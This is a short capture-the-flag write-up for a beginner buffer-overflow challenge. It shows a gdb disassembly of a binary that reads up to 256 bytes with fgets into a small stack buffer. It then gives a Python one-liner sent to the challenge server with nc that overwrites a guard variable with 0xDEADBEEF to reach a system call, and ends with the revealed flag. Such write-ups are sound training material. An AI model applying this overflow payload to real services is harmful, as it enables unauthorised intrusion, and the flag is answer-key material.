#### Challenge:

It's a b0f , Can't be easier than that. [q1](./q1 ':ignore') Service : `nc 68.183.158.95 8989`

---

#### Solution:

![disassembly.png](./disassembly.png ':ignore')

```console
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:     push   rbp
   0x00000000004006c8 <+1>:     mov    rbp,rsp
   0x00000000004006cb <+4>:     sub    rsp,0x10
   0x00000000004006cf <+8>:     mov    edi,0x1e
   0x00000000004006d4 <+13>:    call   0x4005b0 <alarm@plt>
   0x00000000004006d9 <+18>:    mov    rax,QWORD PTR [rip+0x200980]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e0 <+25>:    mov    ecx,0x0
   0x00000000004006e5 <+30>:    mov    edx,0x2
   0x00000000004006ea <+35>:    mov    esi,0x0
   0x00000000004006ef <+40>:    mov    rdi,rax
   0x00000000004006f2 <+43>:    call   0x4005d0 <setvbuf@plt>
   0x00000000004006f7 <+48>:    mov    rax,QWORD PTR [rip+0x200972]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004006fe <+55>:    mov    ecx,0x0
   0x0000000000400703 <+60>:    mov    edx,0x2
   0x0000000000400708 <+65>:    mov    esi,0x0
   0x000000000040070d <+70>:    mov    rdi,rax
   0x0000000000400710 <+73>:    call   0x4005d0 <setvbuf@plt>
   0x0000000000400715 <+78>:    mov    rax,QWORD PTR [rip+0x200964]        # 0x601080 <stderr@@GLIBC_2.2.5>
   0x000000000040071c <+85>:    mov    ecx,0x0
   0x0000000000400721 <+90>:    mov    edx,0x2
   0x0000000000400726 <+95>:    mov    esi,0x0
   0x000000000040072b <+100>:   mov    rdi,rax
   0x000000000040072e <+103>:   call   0x4005d0 <setvbuf@plt>
   0x0000000000400733 <+108>:   mov    DWORD PTR [rbp-0x4],0xcafebabe
   0x000000000040073a <+115>:   mov    QWORD PTR [rbp-0xe],0x0
   0x0000000000400742 <+123>:   mov    WORD PTR [rbp-0x6],0x0
   0x0000000000400748 <+129>:   mov    rdx,QWORD PTR [rip+0x200921]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x000000000040074f <+136>:   lea    rax,[rbp-0xe]
   0x0000000000400753 <+140>:   mov    esi,0x100
   0x0000000000400758 <+145>:   mov    rdi,rax
   0x000000000040075b <+148>:   call   0x4005c0 <fgets@plt>
   0x0000000000400760 <+153>:   cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x0000000000400767 <+160>:   jne    0x400777 <main+176>
   0x0000000000400769 <+162>:   lea    rdi,[rip+0xa4]        # 0x400814
   0x0000000000400770 <+169>:   call   0x4005a0 <system@plt>
   0x0000000000400775 <+174>:   jmp    0x400783 <main+188>
   0x0000000000400777 <+176>:   lea    rdi,[rip+0xa5]        # 0x400823
   0x000000000040077e <+183>:   call   0x400590 <puts@plt>
   0x0000000000400783 <+188>:   mov    eax,0x0
   0x0000000000400788 <+193>:   leave
   0x0000000000400789 <+194>:   ret
End of assembler dump.
(gdb) b *0x0000000000400760
(gdb) r
(gdb) x/x $sp-200
(gdb) x/x $rbp-0x4
```

```bash
python -c "import struct; print 'A' * 10 + struct.pack('<I',0xDEADBEEF )" | nc 68.183.158.95 8989
```

---

<details><summary>FLAG:</summary>

```
d4rk{W3lc0me_t0_th3_w0rld_0f_pwn}c0de
```

</details>